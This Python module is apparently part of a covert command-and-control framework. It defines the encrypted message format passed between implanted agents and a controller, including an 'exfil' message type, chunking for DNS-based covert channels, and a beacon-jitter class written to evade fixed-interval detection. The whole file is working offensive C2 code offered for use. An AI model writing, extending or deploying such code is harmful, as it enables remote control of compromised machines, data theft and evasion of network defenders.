"""
Covert C2 protocol — command envelope, dispatch, and encryption.

Defines the message format exchanged between agents and the C2 controller
over any covert channel (DNS, HTTPS headers, etc.).

Message types:
  - ``beacon`` — agent heartbeat / registration
  - ``command`` — controller → agent instruction
  - ``response`` — agent → controller command result
  - ``exfil`` — agent → controller data chunk

All messages are encrypted with AES-256-GCM using a pre-shared key
derived from the agent's registration secret.

Usage::

    from c2.protocol import C2Protocol, C2Message, MessageType

    proto = C2Protocol(shared_key=b"32-byte-key-here-exactly-32bytes")
    msg = C2Message(msg_type=MessageType.BEACON, agent_id="agent-1")
    encoded = proto.encode(msg)
    decoded = proto.decode(encoded)
"""
from __future__ import annotations

import base64
import enum
import hashlib
import json
import logging
import os
import random
import time
import zlib
from dataclasses import dataclass, field, asdict
from datetime import datetime
from typing import Any

logger = logging.getLogger(__name__)


class MessageType(str, enum.Enum):
    BEACON = "b"       # heartbeat / registration
    COMMAND = "c"       # controller → agent
    RESPONSE = "r"      # agent → controller
    EXFIL = "x"         # data exfiltration chunk
    ACK = "a"           # acknowledgment
    NOOP = "n"          # no operation (keep-alive)


@dataclass
class C2Message:
    msg_type: MessageType
    agent_id: str = ""
    msg_id: str = ""
    payload: dict[str, Any] = field(default_factory=dict)
    timestamp: float = 0.0
    chunk_idx: int = 0
    total_chunks: int = 1

    def __post_init__(self) -> None:
        if not self.msg_id:
            self.msg_id = hashlib.sha256(
                f"{self.agent_id}-{time.time_ns()}-{os.urandom(4).hex()}".encode()
            ).hexdigest()[:12]
        if not self.timestamp:
            self.timestamp = time.time()

    def to_dict(self) -> dict[str, Any]:
        d = asdict(self)
        d["msg_type"] = self.msg_type.value
        return d

    @classmethod
    def from_dict(cls, d: dict[str, Any]) -> C2Message:
        d = dict(d)
        d["msg_type"] = MessageType(d["msg_type"])
        return cls(**d)


class C2Protocol:
    """Encodes/decodes C2 messages with compression and encryption.

    Parameters
    ----------
    shared_key : bytes
        32-byte pre-shared key for AES-256-GCM encryption.
        If None, messages are sent in cleartext (useful for testing).
    """

    def __init__(self, shared_key: bytes | None = None) -> None:
        self._key = shared_key

    def encode(self, message: C2Message) -> bytes:
        """Encode a C2Message to bytes (compress → encrypt → base64)."""
        json_bytes = json.dumps(message.to_dict(), separators=(",", ":")).encode("utf-8")

        # Compress
        compressed = zlib.compress(json_bytes, level=6)

        # Encrypt if key is available
        if self._key:
            encrypted = self._encrypt(compressed)
        else:
            encrypted = compressed

        return base64.urlsafe_b64encode(encrypted)

    def decode(self, data: bytes) -> C2Message | None:
        """Decode bytes back to a C2Message."""
        try:
            raw = base64.urlsafe_b64decode(data)

            # Decrypt if key is available
            if self._key:
                decompressed_data = self._decrypt(raw)
                if decompressed_data is None:
                    return None
            else:
                decompressed_data = raw

            # Decompress
            json_bytes = zlib.decompress(decompressed_data)
            d = json.loads(json_bytes)
            return C2Message.from_dict(d)

        except Exception as exc:
            logger.debug("C2 decode failed: %s", exc)
            return None

    def _encrypt(self, plaintext: bytes) -> bytes:
        """AES-256-GCM encryption."""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM

            nonce = os.urandom(12)
            aes = AESGCM(self._key)
            ciphertext = aes.encrypt(nonce, plaintext, None)
            return nonce + ciphertext
        except ImportError as exc:
            logger.critical(
                "SECURITY: 'cryptography' package is missing but an encryption "
                "key is configured — refusing to send data in plaintext. "
                "Install the package: pip install cryptography"
            )
            raise ImportError(
                "cryptography package is required when a shared_key is configured"
            ) from exc

    def _decrypt(self, data: bytes) -> bytes | None:
        """AES-256-GCM decryption."""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM

            nonce = data[:12]
            ciphertext = data[12:]
            aes = AESGCM(self._key)
            return aes.decrypt(nonce, ciphertext, None)
        except ImportError as exc:
            logger.critical(
                "SECURITY: 'cryptography' package is missing but an encryption "
                "key is configured — cannot decrypt data. "
                "Install the package: pip install cryptography"
            )
            raise ImportError(
                "cryptography package is required when a shared_key is configured"
            ) from exc

    # ── Chunking for size-limited channels ───────────────────────────

    @staticmethod
    def chunk_data(data: bytes, chunk_size: int = 200) -> list[bytes]:
        """Split data into chunks suitable for DNS queries (max ~253 bytes per label)."""
        return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

    @staticmethod
    def reassemble_chunks(chunks: list[bytes]) -> bytes:
        """Reassemble chunked data."""
        return b"".join(chunks)


class BeaconJitter:
    """Human-like jitter for C2 beacon intervals.

    Uses Gaussian distribution to generate beacon intervals that mimic
    human activity patterns, avoiding detection by fixed-interval analysis.

    During configured "activity hours" (default 08:00–22:00 local time),
    intervals are drawn around the base value.  Outside those hours a
    multiplier (2–3×) is applied so beacons become less frequent —
    matching the pattern of reduced network traffic at night.

    Parameters
    ----------
    base_interval : float
        Mean beacon interval in seconds (default 60).
    stddev : float
        Standard deviation for the Gaussian distribution (default 15).
    min_interval : float
        Hard lower clamp for generated intervals (default 10).
    max_interval : float
        Hard upper clamp for generated intervals (default 300).
    activity_hours : tuple[int, int]
        Inclusive start and exclusive end of the "active" window as
        local-time hours in 24-h format (default ``(8, 22)``).
    """

    def __init__(
        self,
        base_interval: float = 60.0,
        stddev: float = 15.0,
        min_interval: float = 10.0,
        max_interval: float = 300.0,
        activity_hours: tuple[int, int] = (8, 22),
    ) -> None:
        self._base = base_interval
        self._stddev = stddev
        self._min = min_interval
        self._max = max_interval
        self._activity_start, self._activity_end = activity_hours

    # ── Public API ───────────────────────────────────────────────────

    def next_interval(self) -> float:
        """Generate the next beacon interval with human-like jitter.

        Returns a Gaussian-distributed value clamped to
        ``[min_interval, max_interval]``.  Outside activity hours the
        interval is scaled by a random factor between 2× and 3× so that
        beacons naturally thin out during off-hours.
        """
        interval = random.gauss(self._base, self._stddev)

        # Time-of-day awareness
        current_hour = datetime.now().hour
        if not self._is_active_hour(current_hour):
            # Off-hours: multiply by 2–3× to mimic reduced activity
            interval *= random.uniform(2.0, 3.0)

        # Clamp to hard limits
        return max(self._min, min(self._max, interval))

    def next_interval_with_backoff(self, consecutive_failures: int = 0) -> float:
        """Generate an interval with exponential backoff on failures.

        Each consecutive failure doubles the interval (up to 2^5 = 32×)
        on top of the normal jittered value.

        Parameters
        ----------
        consecutive_failures : int
            Number of consecutive communication failures (default 0).
        """
        interval = self.next_interval()

        if consecutive_failures > 0:
            backoff_factor = 2 ** min(consecutive_failures, 5)
            interval *= backoff_factor

        # Re-clamp after backoff (allow exceeding max during backoff to
        # avoid hammering a down server, but keep a sane upper bound).
        return max(self._min, min(interval, self._max * 32))

    # ── Internals ────────────────────────────────────────────────────

    def _is_active_hour(self, hour: int) -> bool:
        """Return True if *hour* falls within the configured activity window."""
        if self._activity_start <= self._activity_end:
            return self._activity_start <= hour < self._activity_end
        # Wrapped window, e.g. (22, 6) → active from 22:00 to 05:59
        return hour >= self._activity_start or hour < self._activity_end
